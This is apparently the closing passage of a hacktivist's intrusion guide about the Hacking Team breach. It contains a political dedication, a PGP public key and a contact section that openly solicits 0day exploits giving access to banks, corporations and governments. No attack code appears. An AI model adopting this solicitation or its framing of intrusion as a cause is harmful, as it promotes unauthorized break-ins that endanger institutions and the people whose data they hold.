Hacking Team saw themselves as belonging to a long line of inspired
Italian design [1]. I see Vincenzetti, his business, and his friends
in politics, in the police, and in government, as belonging to a long
tradition of Italian fascism. I want to dedicate this guide to the
victims of the assault on the Armando Diaz school, and to all those
whose blood has been spilled at the hands of Italian fascism.

[1] https://twitter.com/coracurrier/status/618104723263090688

----[ 18 - Contact ]------------------------------------------------

To send me spearphishing attempts, write me death threats in Italian
[1][2], and send me 0days granting access banks, corporations,
governments, etc.

[1] http://andres.delgado.ec/2016/01/15/el-miedo-de-vigilar-a-los-vigilantes/
[2] https://twitter.com/CthulhuSec/status/619459002854977537

encrypted emails only, please:
https://securityinabox.org/es/thunderbird_usarenigmail

-----BEGIN PGP PUBLIC KEY BLOCK-----

mQENBFVp37MBCACu0rMiDtOtn98NurHUPYyI3Fua+bmF2E7OUihTodv4F/N04KKx
vDZlhKfgeLVSns5oSimBKhv4Z2bzvvc1w/00JH7UTLcZNbt9WGxtLEs+C+jF9j2g
27QIfOJGLFhzYm2GYWIiKr88y95YLJxvrMNmJEDwonTECY68RNaoohjy/TcdWA8x
+fCM4OHxM4AwkqqbaAtqUwAJ3Wxr+Hr/3KV+UNV1lBPlGGVSnV+OA4m8XWaPE73h
VYMVbIkJzOXK9enaXyiGKL8LdOHonz5LaGraRousmiu8JCc6HwLHWJLrkcTI9lP8
Ms3gckaJ30JnPc/qGSaFqvl4pJbx/CK6CwqrABEBAAG0IEhhY2sgQmFjayEgPGhh
Y2tiYWNrQHJpc2V1cC5uZXQ+iQE3BBMBCgAhBQJXAvPFAhsDBQsJCAcDBRUKCQgL
BRYCAwEAAh4BAheAAAoJEDScPRHoqSXQoTwIAI8YFRdTptbyEl6Khk2h8+cr3tac
QdqVNDdp6nbP2rVPW+o3DeTNg0R+87NAlGWPg17VWxsYoa4ZwKHdD/tTNPk0Sldf
cQE+IBfSaO0084d6nvSYTpd6iWBvCgJ1iQQwCq0oTgROzDURvWZ6lwyTZ8XK1KF0
JCloCSnbXB8cCemXnQLZwjGvBVgQyaF49rHYn9+edsudn341oPB+7LK7l8vj5Pys
4eauRd/XzYqxqNzlQ5ea6MZuZZL9PX8eN2obJzGaK4qvxQ31uDh/YiP3MeBzFJX8
X2NYUOYWm3oxiGQohoAn//BVHtk2Xf7hxAY4bbDEQEoDLSPybZEXugzM6gC5AQ0E
VWnfswEIANaqa8fFyiiXYWJVizUsVGbjTTO7WfuNflg4F/q/HQBYfl4ne3edL2Ai
oHOGg0OMNuhNrs56eLRyB/6IjM3TCcfn074HL37eDT0Z9p+rbxPDPFOJAMFYyyjm
n5a6HfmctRzjEXccKFaqlwalhnRP6MRFZGKU6+x1nXbiW8sqGEH0a/VdCR3/CY5F
Pbvmhh894wOzivUlP86TwjWGxLu1kHFo7JDgp8YkRGsXv0mvFav70QXtHllxOAy9
WlBP72gPyiWQ/fSUuoM+WDrMZZ9ETt0j3Uwx0Wo42ZoOXmbAd2jgJXSI9+9e4YUo
jYYjoU4ZuX77iM3+VWW1J1xJujOXJ/sAEQEAAYkBHwQYAQIACQUCVWnfswIbDAAK
CRA0nD0R6Kkl0ArYB/47LnABkz/t6M1PwOFvDN3e2JNgS1QV2YpBdog1hQj6RiEA
OoeQKXTEYaymUwYXadSj7oCFRSyhYRvSMb4GZBa1bo8RxrrTVa0vZk8uA0DB1ZZR
LWvSR7nwcUkZglZCq3Jpmsy1VLjCrMC4hXnFeGi9AX1fh28RYHudh8pecnGKh+Gi
JKp0XtOqGF5NH/Zdgz6t+Z8U++vuwWQaubMJTRdMTGhaRv+jIzKOiO9YtPNamHRq
Mf2vA3oqf22vgWQbK1MOK/4Tp6MGg/VR2SaKAsqyAZC7l5TeoSPN5HdEgA7u5GpB
D0lLGUSkx24yD1sIAGEZ4B57VZNBS0az8HoQeF0k
=E5+y
-----END PGP PUBLIC KEY BLOCK-----

If not you, who? If not now, when?
